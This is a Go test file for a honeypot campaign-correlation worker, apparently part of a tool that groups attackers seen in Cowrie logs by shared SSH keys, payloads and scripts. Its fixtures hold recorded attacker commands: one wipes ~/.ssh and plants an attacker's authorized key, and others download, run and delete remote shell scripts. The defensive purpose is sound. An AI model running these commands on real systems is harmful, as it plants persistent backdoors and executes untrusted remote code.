package campaign

import (
	"context"
	"database/sql"
	"errors"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"testing"
	"time"

	"github.com/networkshard/shardlure/internal/script"
	"github.com/networkshard/shardlure/internal/store"
	"github.com/networkshard/shardlure/pkg/models"
)

const outlawCmd = `cd ~; chattr -ia .ssh; rm -rf .ssh && mkdir .ssh && echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKBT1fubDzcjP8Ntf33MZwaTgCpwTQRaj7IrSvXO0lBU mdrfckr" >> .ssh/authorized_keys`

func openStore(t *testing.T) *store.Store {
	t.Helper()
	st, err := store.Open(filepath.Join(t.TempDir(), "w.db"))
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { st.Close() })
	return st
}

func insertSharedKey(t *testing.T, st *store.Store, actors ...string) {
	t.Helper()
	for i, a := range actors {
		if err := st.InsertEvent(&models.Event{TS: time.Now().UTC().Add(-time.Hour), Source: models.SourceCowrie, Kind: models.KindCommand,
			SessionID: fmt.Sprintf("s%d", i), ActorID: a, SrcIP: "198.51.100.1", Command: outlawCmd}); err != nil {
			t.Fatal(err)
		}
	}
}

func TestWorkerBuildsCampaignFromSharedKey(t *testing.T) {
	st, err := store.Open(filepath.Join(t.TempDir(), "w.db"))
	if err != nil {
		t.Fatal(err)
	}
	defer st.Close()
	for i, a := range []string{"cowrie:a", "cowrie:b"} {
		if err := st.InsertEvent(&models.Event{TS: time.Now().UTC().Add(-time.Hour), Source: models.SourceCowrie, Kind: models.KindCommand,
			SessionID: fmt.Sprintf("s%d", i), ActorID: a, SrcIP: "198.51.100.1", Command: outlawCmd}); err != nil {
			t.Fatal(err)
		}
	}
	w := NewWorker(st, 90, t.TempDir())
	if err := w.Tick(context.Background()); err != nil {
		t.Fatal(err)
	}
	list, err := st.ListCampaigns(context.Background(), 10)
	if err != nil || len(list) != 1 || list[0].Actors != 2 {
		t.Fatalf("campaigns %+v %v", list, err)
	}
}

func TestPayloadAndCommonFilters(t *testing.T) {
	now := time.Now().UTC()
	row := func(kind, value, session, actor string, size int64) store.EvidenceRow {
		return store.EvidenceRow{Kind: kind, Value: value, SessionID: session, ActorID: actor, IP: "i", FirstSeen: now, LastSeen: now, SizeBytes: size}
	}
	ev := []store.EvidenceRow{
		row("payload", "unknown", "s1", "a", -1), row("payload", "unknown", "s2", "b", -1), // unknown size: fail closed
		row("payload", "tiny", "s1", "a", 8), row("payload", "tiny", "s2", "b", 8),
		row("payload", "miner", "s1", "a", 5000), row("payload", "miner", "s2", "b", 5000),
		row("payload", "good", "s1", "a", 5000), row("payload", "good", "s2", "b", 5000),
	}
	for i := 0; i < 30; i++ { // a key used by 30 actors is common
		ev = append(ev, row("ssh_key", "SHA256:kit", fmt.Sprintf("k%d", i), fmt.Sprintf("actor%d", i), -1))
	}
	fam := map[string]string{"miner": "coinminer"}
	got := linkingOccurrences(ev, nil, 5000, func(sha string) string { return fam[sha] })
	for _, o := range got {
		if o.Value != "good" {
			t.Fatalf("value %q must not link", o.Value)
		}
	}
	if len(got) != 2 {
		t.Fatalf("got %d occurrences", len(got))
	}
}

// The payload rule and the never-link kinds, beyond the brief's fixture: the
// empty-file hash, the classifier's mixed-case "XMRig", a payload that could
// not be classified at all, and context-only kinds.
func TestLinkingRulesRejectContextAndUnclassified(t *testing.T) {
	now := time.Now().UTC()
	pair := func(kind, value string, size int64) []store.EvidenceRow {
		return []store.EvidenceRow{
			{Kind: kind, Value: value, SessionID: "s1", ActorID: "a", IP: "i", FirstSeen: now, LastSeen: now, SizeBytes: size},
			{Kind: kind, Value: value, SessionID: "s2", ActorID: "b", IP: "i", FirstSeen: now, LastSeen: now, SizeBytes: size},
		}
	}
	var ev []store.EvidenceRow
	ev = append(ev, pair("payload", emptyFileSHA256, 5000)...)
	ev = append(ev, pair("payload", "xmrig", 5000)...)
	ev = append(ev, pair("payload", "unreadable", 5000)...)
	ev = append(ev, pair("payload", "redtail", 5000)...)
	ev = append(ev, pair("hassh", "h1", -1)...)
	ev = append(ev, pair("client", "SSH-2.0-Go", -1)...)
	ev = append(ev, pair("host", "203.0.113.9", -1)...)
	fam := map[string]string{"xmrig": "XMRig", "unreadable": unclassified, "redtail": "redtail"}
	got := linkingOccurrences(ev, nil, 5000, func(sha string) string { return fam[sha] })
	if len(got) != 2 || got[0].Value != "redtail" || got[0].Family != "redtail" {
		t.Fatalf("got %+v", got)
	}
}

func TestScriptsLinkOnlyThroughLinkDecision(t *testing.T) {
	now := time.Now().UTC()
	occ := func(fp, session, actor string, distinctive bool) store.ScriptOccRow {
		return store.ScriptOccRow{Fingerprint: fp, SessionID: session, ActorID: actor, IP: "i", FirstSeen: now, LastSeen: now, Distinctive: distinctive}
	}
	scripts := []store.ScriptOccRow{
		occ("recon", "s1", "a", false), occ("recon", "s2", "b", false),
		occ("tool", "s1", "a", true), occ("tool", "s2", "b", true),
	}
	for i := 0; i < 30; i++ {
		scripts = append(scripts, occ("everyone", fmt.Sprintf("e%d", i), fmt.Sprintf("actor%d", i), true))
	}
	got := linkingOccurrences(nil, scripts, 5000, func(string) string { return "" })
	if len(got) != 2 || got[0].Value != "tool" || got[0].Kind != "script" {
		t.Fatalf("got %+v", got)
	}
}

func TestWorkerBacksOffAfterFailure(t *testing.T) {
	st, err := store.Open(filepath.Join(t.TempDir(), "b.db"))
	if err != nil {
		t.Fatal(err)
	}
	w := NewWorker(st, 90, t.TempDir())
	st.Close() // every query now fails
	if err := w.Tick(context.Background()); err == nil {
		t.Fatal("expected failure")
	}
	if err := w.Tick(context.Background()); err != nil {
		t.Fatalf("tick inside the backoff window must be a no-op, got %v", err)
	}
}

// An edit appended after Regroup read the edit log but before it saved must
// make the save refuse (ErrStaleGrouping), and the next regroup applies it.
func TestStaleSaveIsRefusedAndNextRegroupIncludesEdit(t *testing.T) {
	st := openStore(t)
	insertSharedKey(t, st, "cowrie:a", "cowrie:b")
	ctx := context.Background()
	w := NewWorker(st, 90, t.TempDir())
	if err := w.Tick(ctx); err != nil {
		t.Fatal(err)
	}
	list, err := st.ListCampaigns(ctx, 10)
	if err != nil || len(list) != 1 {
		t.Fatalf("campaigns %+v %v", list, err)
	}
	id := list[0].ID
	beforeSave = func() {
		beforeSave = nil
		if err := st.AppendCampaignEdit(ctx, id, "rename", "Racing Rename", "test"); err != nil {
			t.Error(err)
		}
	}
	t.Cleanup(func() { beforeSave = nil })
	if err := w.Regroup(ctx); !errors.Is(err, store.ErrStaleGrouping) {
		t.Fatalf("Regroup = %v, want ErrStaleGrouping", err)
	}
	if list, _ := st.ListCampaigns(ctx, 10); len(list) != 1 || list[0].Name != "" {
		t.Fatalf("stale grouping was saved: %+v", list)
	}
	if err := w.Regroup(ctx); err != nil {
		t.Fatal(err)
	}
	if list, _ := st.ListCampaigns(ctx, 10); len(list) != 1 || list[0].Name != "Racing Rename" {
		t.Fatalf("edit not applied by the next regroup: %+v", list)
	}
}

// Through Tick, a stale save is not a failure: no error, no backoff, and the
// very next tick regroups.
func TestTickTreatsStaleSaveAsRetryNotFailure(t *testing.T) {
	st := openStore(t)
	insertSharedKey(t, st, "cowrie:a", "cowrie:b")
	ctx := context.Background()
	w := NewWorker(st, 90, t.TempDir())
	if err := w.Tick(ctx); err != nil {
		t.Fatal(err)
	}
	list, _ := st.ListCampaigns(ctx, 10)
	id := list[0].ID
	beforeSave = func() {
		beforeSave = nil
		if err := st.AppendCampaignEdit(ctx, id, "rename", "Second", "test"); err != nil {
			t.Error(err)
		}
	}
	t.Cleanup(func() { beforeSave = nil })
	w.Wake()
	if err := w.Tick(ctx); err != nil {
		t.Fatalf("stale save surfaced as failure: %v", err)
	}
	if !w.retryAt.IsZero() && time.Now().Before(w.retryAt) {
		t.Fatal("stale save started a backoff")
	}
	if err := w.Tick(ctx); err != nil {
		t.Fatal(err)
	}
	if list, _ := st.ListCampaigns(ctx, 10); len(list) != 1 || list[0].Name != "Second" {
		t.Fatalf("next tick did not regroup: %+v", list)
	}
}

// Wake regroups on the next tick; without it an edit waits for the 10-minute
// schedule.
func TestWakeRegroupsWithinOneTick(t *testing.T) {
	st := openStore(t)
	insertSharedKey(t, st, "cowrie:a", "cowrie:b")
	ctx := context.Background()
	w := NewWorker(st, 90, t.TempDir())
	if err := w.Tick(ctx); err != nil {
		t.Fatal(err)
	}
	list, _ := st.ListCampaigns(ctx, 10)
	if err := st.AppendCampaignEdit(ctx, list[0].ID, "rename", "Outlaw", "test"); err != nil {
		t.Fatal(err)
	}
	if err := w.Tick(ctx); err != nil {
		t.Fatal(err)
	}
	if list, _ := st.ListCampaigns(ctx, 10); list[0].Name != "" {
		t.Fatalf("regrouped without a wake or schedule: %+v", list)
	}
	w.Wake()
	if err := w.Tick(ctx); err != nil {
		t.Fatal(err)
	}
	if list, _ := st.ListCampaigns(ctx, 10); list[0].Name != "Outlaw" {
		t.Fatalf("wake did not regroup: %+v", list)
	}
}

// SaveGrouping rejects the whole grouping on an empty field, so the mapping
// must never produce one: nil reasons become "[]".
func TestGroupingRowsNeverCarryEmptyReasons(t *testing.T) {
	out := Output{Campaigns: []Campaign{{ID: "c-1", Members: []Member{{ActorID: "cowrie:a"}}}}}
	rows, _ := groupingRows(out)
	if rows[0].Members[0].Reasons != "[]" || rows[0].Actors != 1 {
		t.Fatalf("rows %+v", rows)
	}
}

// familyOf reads only through a pinned descriptor on the evidence root: a
// regular single-link file inside the root is classified; a symlink planted
// at the artifact path (even one pointing inside the root), a hardlink, a
// FIFO and a file outside the root are refused (fail closed), and the FIFO
// is refused without blocking.
func TestFamilyOfOnlyReadsInsideEvidenceRoot(t *testing.T) {
	st := openStore(t)
	ctx := context.Background()
	root := t.TempDir()
	outside := t.TempDir()
	write := func(p, body string) {
		if err := os.WriteFile(p, []byte(body), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	inside := filepath.Join(root, "in.bin")
	write(inside, "inside payload")
	away := filepath.Join(outside, "away.bin")
	write(away, "outside payload")
	escape := filepath.Join(root, "escape.bin")
	if err := os.Symlink(away, escape); err != nil {
		t.Fatal(err)
	}
	target := filepath.Join(root, "target.bin")
	write(target, "symlink target payload")
	planted := filepath.Join(root, "planted.bin")
	if err := os.Symlink(target, planted); err != nil {
		t.Fatal(err)
	}
	orig := filepath.Join(root, "orig.bin")
	write(orig, "hardlinked payload")
	hard := filepath.Join(root, "hard.bin")
	if err := os.Link(orig, hard); err != nil {
		t.Fatal(err)
	}
	fifo := filepath.Join(root, "pipe.bin")
	if err := syscall.Mkfifo(fifo, 0o600); err != nil {
		t.Fatal(err)
	}
	sub := filepath.Join(root, "sub")
	if err := os.Mkdir(sub, 0o700); err != nil {
		t.Fatal(err)
	}
	nested := filepath.Join(sub, "n.bin")
	write(nested, "nested payload")
	arts := map[string]string{"aa": inside, "bb": away, "cc": escape, "dd": planted, "ee": hard, "ff": fifo, "gg": nested,
		"hh": filepath.Join(root, "sub", "..", "..", filepath.Base(outside), "away.bin")}
	for sha, p := range arts {
		if err := st.RecordArtifact(store.Artifact{TS: time.Now().UTC(), SHA256: sha, LocalPath: p, SizeBytes: 100, Status: "fetched", Origin: "cowrie_download", URL: "cowrie-download:" + sha}); err != nil {
			t.Fatal(err)
		}
	}
	var read []string
	w := NewWorker(st, 90, root)
	t.Cleanup(w.Close)
	w.classify = func(f *os.File) (string, error) {
		b, err := io.ReadAll(f)
		read = append(read, string(b))
		return "RedTail", err
	}
	done := make(chan map[string]string, 1)
	go func() {
		got := map[string]string{}
		for _, sha := range []string{"aa", "bb", "cc", "dd", "ee", "ff", "gg", "hh", "missing"} {
			got[sha] = w.familyOf(ctx, sha)
		}
		done <- got
	}()
	var got map[string]string
	select {
	case got = <-done:
	case <-time.After(10 * time.Second):
		t.Fatal("familyOf blocked (FIFO opened for reading?)")
	}
	want := map[string]string{"aa": "redtail", "gg": "redtail"}
	for sha, f := range got {
		if w, ok := want[sha]; ok != (f != unclassified) || (ok && f != w) {
			t.Errorf("%s (%s): family %q", sha, arts[sha], f)
		}
	}
	if strings.Join(read, "|") != "inside payload|nested payload" {
		t.Fatalf("classifier read %q", read)
	}
	noRoot := NewWorker(st, 90, "")
	noRoot.classify = w.classify
	if f := noRoot.familyOf(ctx, "aa"); f != unclassified || len(read) != 2 {
		t.Fatalf("no evidence root must not read files: %q %v", f, read)
	}
	missingRoot := NewWorker(st, 90, filepath.Join(root, "absent"))
	missingRoot.classify = w.classify
	if f := missingRoot.familyOf(ctx, "aa"); f != unclassified || len(read) != 2 {
		t.Fatalf("missing evidence root must fail closed: %q %v", f, read)
	}
}

// The evidence root is opened once, lazily, and a root that is missing at the
// first lookup is retried (not remembered as a failure) once it appears.
func TestFamilyOfOpensRootOnceAndRetriesMissingRoot(t *testing.T) {
	st := openStore(t)
	ctx := context.Background()
	root := filepath.Join(t.TempDir(), "evidence")
	w := NewWorker(st, 90, root)
	t.Cleanup(w.Close)
	w.classify = func(*os.File) (string, error) { return "", nil }
	p := filepath.Join(root, "p.bin")
	if err := st.RecordArtifact(store.Artifact{TS: time.Now().UTC(), SHA256: "aa", LocalPath: p, SizeBytes: 100, Status: "fetched", Origin: "cowrie_download", URL: "cowrie-download:aa"}); err != nil {
		t.Fatal(err)
	}
	if f := w.familyOf(ctx, "aa"); f != unclassified || w.root != nil {
		t.Fatalf("missing root: family %q root %v", f, w.root)
	}
	if err := os.Mkdir(root, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(p, []byte("payload"), 0o600); err != nil {
		t.Fatal(err)
	}
	if f := w.familyOf(ctx, "aa"); f != "" || w.root == nil {
		t.Fatalf("root not opened once present: family %q", f)
	}
	opened := w.root
	delete(w.families, "aa")
	w.familyOf(ctx, "aa")
	if w.root != opened {
		t.Fatal("evidence root re-opened per lookup")
	}
}

// A backlog reappearing after the first drain (a replace-ingest re-inserts its
// rows above the parked cursor, or a burst larger than one window) makes scheduled regroups wait
// for it again; a Wake still regroups at once.
func TestBacklogAfterDrainDefersScheduledRegroup(t *testing.T) {
	st := openStore(t)
	insertSharedKey(t, st, "cowrie:a", "cowrie:b")
	ctx := context.Background()
	w := NewWorker(st, 90, t.TempDir())
	if err := w.Tick(ctx); err != nil {
		t.Fatal(err)
	}
	if !w.drained {
		t.Fatal("initial backlog not drained")
	}
	for i := 0; i < 3; i++ {
		if err := st.InsertEvent(&models.Event{TS: time.Now().UTC(), Source: models.SourceCowrie, Kind: models.KindCommand,
			SessionID: fmt.Sprintf("late%d", i), ActorID: "cowrie:c", SrcIP: "198.51.100.2", Command: "uname -a"}); err != nil {
			t.Fatal(err)
		}
	}
	w.window, w.maxWindows = 1, 1
	w.lastGroup = time.Now().Add(-time.Hour) // the schedule alone would be due
	if err := w.Tick(ctx); err != nil {
		t.Fatal(err)
	}
	if w.drained || w.lastGroup.After(time.Now().Add(-time.Minute)) {
		t.Fatalf("scheduled regroup ran during a backlog: drained=%v lastGroup=%v", w.drained, w.lastGroup)
	}
	w.Wake()
	if err := w.Tick(ctx); err != nil {
		t.Fatal(err)
	}
	if w.lastGroup.Before(time.Now().Add(-time.Minute)) {
		t.Fatal("wake did not regroup during a backlog")
	}
	w.window, w.maxWindows = recordWindow, maxWindowsPerTick
	if err := w.Tick(ctx); err != nil {
		t.Fatal(err)
	}
	if !w.drained || w.pending {
		t.Fatalf("drain did not trigger the owed regroup: drained=%v pending=%v", w.drained, w.pending)
	}
}

// A burst larger than one window that drains within the same tick is not a
// backlog that outlived a tick: it must not force an extra regroup. Only a
// tick that ENDS with the recorder not done defers the schedule and owes a
// regroup once drained.
func TestBurstDrainedWithinOneTickDoesNotForceRegroup(t *testing.T) {
	st := openStore(t)
	insertSharedKey(t, st, "cowrie:a", "cowrie:b")
	ctx := context.Background()
	w := NewWorker(st, 90, t.TempDir())
	t.Cleanup(w.Close)
	if err := w.Tick(ctx); err != nil {
		t.Fatal(err)
	}
	if !w.drained || w.pending {
		t.Fatalf("initial backlog: drained=%v pending=%v", w.drained, w.pending)
	}
	last := w.lastGroup
	for i := 0; i < 5; i++ {
		if err := st.InsertEvent(&models.Event{TS: time.Now().UTC(), Source: models.SourceCowrie, Kind: models.KindCommand,
			SessionID: fmt.Sprintf("burst%d", i), ActorID: "cowrie:c", SrcIP: "198.51.100.2", Command: "uname -a"}); err != nil {
			t.Fatal(err)
		}
	}
	w.window, w.maxWindows = 1, 20 // five windows, all inside this tick
	if err := w.Tick(ctx); err != nil {
		t.Fatal(err)
	}
	if !w.drained || w.pending || !w.lastGroup.Equal(last) {
		t.Fatalf("burst drained within one tick forced a regroup: drained=%v pending=%v regrouped=%v",
			w.drained, w.pending, !w.lastGroup.Equal(last))
	}
}

// A classifier read error means unclassified and is not memoised: the next
// lookup reads the file again and a success is remembered.
func TestFamilyOfDoesNotMemoiseReadErrors(t *testing.T) {
	st := openStore(t)
	ctx := context.Background()
	root := t.TempDir()
	p := filepath.Join(root, "p.bin")
	if err := os.WriteFile(p, []byte("payload"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := st.RecordArtifact(store.Artifact{TS: time.Now().UTC(), SHA256: "aa", LocalPath: p, SizeBytes: 100, Status: "fetched", Origin: "cowrie_download", URL: "cowrie-download:aa"}); err != nil {
		t.Fatal(err)
	}
	w := NewWorker(st, 90, root)
	t.Cleanup(w.Close)
	calls := 0
	w.classify = func(*os.File) (string, error) {
		calls++
		if calls == 1 {
			return "", errors.New("read: input/output error")
		}
		return "RedTail", nil
	}
	if f := w.familyOf(ctx, "aa"); f != unclassified {
		t.Fatalf("read error: family %q", f)
	}
	if _, ok := w.families["aa"]; ok {
		t.Fatal("read error memoised")
	}
	if f := w.familyOf(ctx, "aa"); f != "redtail" || calls != 2 {
		t.Fatalf("retry: family %q calls %d", f, calls)
	}
	if f := w.familyOf(ctx, "aa"); f != "redtail" || calls != 2 {
		t.Fatalf("success not memoised: family %q calls %d", f, calls)
	}
}

// A cancelled regroup never classifies: familyOf fails closed.
func TestFamilyOfFailsClosedOnCancel(t *testing.T) {
	st := openStore(t)
	w := NewWorker(st, 90, t.TempDir())
	w.classify = func(*os.File) (string, error) { t.Fatal("classified after cancel"); return "", nil }
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	if f := w.familyOf(ctx, "aa"); f != unclassified {
		t.Fatalf("family %q", f)
	}
}

// PruneOrphanScripts is a DELETE ... WHERE NOT EXISTS scan under writeMu.
// Orphans only arise when a session settles under a new fingerprint or a
// regroup rebuilds families, so an idle tick must not take the writer lock
// for it; a tick that settled or regrouped still prunes.
func TestPruneRunsOnlyAfterSettleOrRegroup(t *testing.T) {
	st := openStore(t)
	ctx := context.Background()
	insertSharedKey(t, st, "cowrie:a", "cowrie:b")
	w := NewWorker(st, 90, t.TempDir())
	if err := w.Tick(ctx); err != nil { // drains the backlog and regroups
		t.Fatal(err)
	}
	// An orphan script: a settled session whose rows retention then removed
	// (the purge leaves scripts to the worker's prune).
	old := time.Now().UTC().AddDate(0, 0, -120)
	if err := st.InsertEvent(&models.Event{TS: old, Source: models.SourceCowrie, Kind: models.KindCommand, SessionID: "orph",
		ActorID: "cowrie:z", SrcIP: "198.51.100.9", Command: "cd /tmp; wget http://x/y; chmod +x y; ./y; rm y"}); err != nil {
		t.Fatal(err)
	}
	if _, err := st.RecordCampaignEvidence(ctx, 5000); err != nil {
		t.Fatal(err)
	}
	if n, err := st.SettleSessionScripts(ctx, time.Now().Add(time.Hour), 10); err != nil || n < 1 {
		t.Fatalf("settle n=%d err=%v", n, err)
	}
	rows, err := st.SettledScriptRows(ctx)
	if err != nil {
		t.Fatal(err)
	}
	var fp string
	for _, r := range rows {
		if r.SessionID == "orph" {
			fp = r.Fingerprint
		}
	}
	if fp == "" {
		t.Fatal("orph did not settle")
	}
	if err := st.MaintenancePurge(90); err != nil {
		t.Fatal(err)
	}
	if _, err := st.GetScript(ctx, fp); err != nil {
		t.Fatalf("orphan script must exist before the tick: %v", err)
	}
	if err := w.Tick(ctx); err != nil { // nothing to record, settle or regroup
		t.Fatal(err)
	}
	if _, err := st.GetScript(ctx, fp); err != nil {
		t.Fatalf("an idle tick pruned (took writeMu for nothing): %v", err)
	}
	w.Wake()
	if err := w.Tick(ctx); err != nil { // regroups, so the gate opens
		t.Fatal(err)
	}
	if _, err := st.GetScript(ctx, fp); !errors.Is(err, sql.ErrNoRows) {
		t.Fatalf("orphan survived a regroup tick: %v", err)
	}
}

// Rows the recorder drops for an unusable timestamp are reported, not lost
// silently: the tick logs how many it skipped.
func TestTickLogsSkippedTimestamps(t *testing.T) {
	path := filepath.Join(t.TempDir(), "skip.db")
	st, err := store.Open(path)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { st.Close() })
	insertSharedKey(t, st, "cowrie:a", "cowrie:b")
	raw, err := sql.Open("sqlite", path)
	if err != nil {
		t.Fatal(err)
	}
	defer raw.Close()
	if _, err := raw.Exec(`UPDATE events SET ts='garbage', ts_unix_ns=NULL WHERE session_id='s1'`); err != nil {
		t.Fatal(err)
	}
	var logged []string
	old := logf
	logf = func(format string, args ...any) { logged = append(logged, fmt.Sprintf(format, args...)) }
	t.Cleanup(func() { logf = old })
	if err := NewWorker(st, 90, t.TempDir()).Tick(context.Background()); err != nil {
		t.Fatal(err)
	}
	if len(logged) != 1 || !strings.Contains(logged[0], "skipped 1 ") {
		t.Fatalf("logged %q", logged)
	}
}

// A normaliser version change re-encodes every stored line without losing
// operator work on a campaign held together only by a script. Two cases:
// the rebuild re-encodes to the same fingerprint, and to a different one.
// The different one is simulated by rewriting the stored state as the old
// normaliser would have left it (fingerprint F' everywhere: session rows,
// scripts, campaign_ids): the current normaliser then re-encodes the same
// commands to F. That exercises exactly what a real encoding change does to
// the tables, without a second normaliser in the test binary.
//
// Before the hold, the drain-triggered regroup ran before any re-recorded
// session settled, dropped the script row from campaign_ids, and the
// settled sessions came back under a fresh ID, leaving "Keep" on an empty
// shell.
func TestNormaliserVersionChangeKeepsScriptCampaign(t *testing.T) {
	for _, changed := range []bool{false, true} {
		t.Run(fmt.Sprintf("changed=%v", changed), func(t *testing.T) { versionChangeCase(t, changed) })
	}
}

const scriptOnlyCmd = "cd /tmp; wget http://198.51.100.9/a.sh; chmod +x a.sh; ./a.sh; rm -f a.sh"

func versionChangeCase(t *testing.T, changed bool) {
	path := filepath.Join(t.TempDir(), "version.db")
	st, err := store.Open(path)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { st.Close() })
	ctx := context.Background()
	for i, a := range []string{"cowrie:a", "cowrie:b"} {
		if err := st.InsertEvent(&models.Event{TS: time.Now().UTC().Add(-time.Hour), Source: models.SourceCowrie, Kind: models.KindCommand,
			SessionID: fmt.Sprintf("s%d", i), ActorID: a, SrcIP: "198.51.100.1", Command: scriptOnlyCmd}); err != nil {
			t.Fatal(err)
		}
	}
	raw, err := sql.Open("sqlite", path)
	if err != nil {
		t.Fatal(err)
	}
	defer raw.Close()
	one := func(q string, args ...any) string {
		t.Helper()
		var v string
		if err := raw.QueryRow(q, args...).Scan(&v); err != nil {
			t.Fatalf("%s: %v", q, err)
		}
		return v
	}
	old := NewWorker(st, 90, t.TempDir())
	old.scriptVersion, old.idle = script.Version-1, -time.Minute
	if err := old.Tick(ctx); err != nil {
		t.Fatal(err)
	}
	list, err := st.ListCampaigns(ctx, 10)
	if err != nil || len(list) != 1 || list[0].Actors != 2 {
		t.Fatalf("script-only campaign %+v %v", list, err)
	}
	id := list[0].ID
	if err := st.AppendCampaignEdit(ctx, id, "rename", "Keep", "cli"); err != nil {
		t.Fatal(err)
	}
	old.Wake()
	if err := old.Tick(ctx); err != nil {
		t.Fatal(err)
	}
	fp := one(`SELECT value FROM campaign_ids WHERE kind='script'`)
	for _, q := range []string{`UPDATE session_script_lines SET line='old-encoding'`} {
		if _, err := raw.Exec(q); err != nil {
			t.Fatal(err)
		}
	}
	if changed {
		oldFP := strings.Repeat("f", 64)
		for _, q := range []string{
			`UPDATE session_scripts SET fingerprint=?1`, `UPDATE scripts SET fingerprint=?1, family=?1`,
			`UPDATE campaign_ids SET value=?1 WHERE kind='script'`, `DELETE FROM script_families`,
		} {
			if _, err := raw.Exec(q, oldFP); err != nil {
				t.Fatal(err)
			}
		}
		if oldFP == fp {
			t.Fatal("precondition: the simulated old fingerprint must differ")
		}
	}
	storedFP := one(`SELECT value FROM campaign_ids WHERE kind='script'`)

	// The upgraded binary, with the real 10-minute idle: nothing settles yet.
	w := NewWorker(st, 90, t.TempDir())
	if err := w.Tick(ctx); err != nil {
		t.Fatal(err)
	}
	w.Wake() // an edit during the hold is recorded but must not regroup
	if err := w.Tick(ctx); err != nil {
		t.Fatal(err)
	}
	if got := one(`SELECT COUNT(*) FROM session_script_lines WHERE line='old-encoding'`); got != "0" {
		t.Fatalf("%s lines not re-encoded", got)
	}
	if got := one(`SELECT value FROM campaign_ids WHERE kind='script'`); got != storedFP {
		t.Fatalf("a regroup ran during the hold: script row %s, want %s", got, storedFP)
	}
	if got := one(`SELECT offset FROM ingest_state WHERE source='script_version' AND path='normaliser'`); got != fmt.Sprint(script.Version) {
		t.Fatalf("stored version %s", got)
	}

	// A restart mid-hold: the hold is read from the store. Sessions settle,
	// the hold releases (carrying the assignment) and the owed regroup runs.
	w = NewWorker(st, 90, t.TempDir())
	w.idle = -time.Minute
	if err := w.Tick(ctx); err != nil {
		t.Fatal(err)
	}
	if got := one(`SELECT COUNT(*) FROM ingest_state WHERE source='script_version' AND path<>'normaliser'`); got != "0" {
		t.Fatalf("hold not released (%s rows)", got)
	}
	list, err = st.ListCampaigns(ctx, 10)
	if err != nil || len(list) != 1 || list[0].ID != id || list[0].Name != "Keep" || list[0].Actors != 2 {
		t.Fatalf("campaign after rebuild %+v %v (want %s named Keep with 2 actors)", list, err, id)
	}
	if got := one(`SELECT value FROM campaign_ids WHERE kind='script' AND campaign_id=?`, id); got != fp {
		t.Fatalf("script row %s, want the re-encoded fingerprint %s", got, fp)
	}
	if got := one(`SELECT COUNT(*) FROM script_version_carry`); got != "0" {
		t.Fatalf("carry map left behind: %s rows", got)
	}
}

// A matching version resets nothing, and a fresh database sets no hold.
func TestMatchingVersionResetsNothing(t *testing.T) {
	path := filepath.Join(t.TempDir(), "same.db")
	st, err := store.Open(path)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { st.Close() })
	ctx := context.Background()
	insertSharedKey(t, st, "cowrie:a", "cowrie:b")
	if err := NewWorker(st, 90, t.TempDir()).Tick(ctx); err != nil {
		t.Fatal(err)
	}
	raw, err := sql.Open("sqlite", path)
	if err != nil {
		t.Fatal(err)
	}
	defer raw.Close()
	var holds int
	raw.QueryRow(`SELECT COUNT(*) FROM ingest_state WHERE source='script_version' AND path<>'normaliser'`).Scan(&holds)
	if holds != 0 {
		t.Fatalf("fresh database set a hold (%d rows)", holds)
	}
	if _, err := raw.Exec(`UPDATE session_script_lines SET line='kept'`); err != nil {
		t.Fatal(err)
	}
	var logged []string
	oldLog := logf
	logf = func(format string, args ...any) { logged = append(logged, fmt.Sprintf(format, args...)) }
	t.Cleanup(func() { logf = oldLog })
	if err := NewWorker(st, 90, t.TempDir()).Tick(ctx); err != nil {
		t.Fatal(err)
	}
	var kept int
	raw.QueryRow(`SELECT COUNT(*) FROM session_script_lines WHERE line='kept'`).Scan(&kept)
	if kept != 2 || len(logged) != 0 {
		t.Fatalf("a matching version reset the lines (%d kept, logged %q)", kept, logged)
	}
}
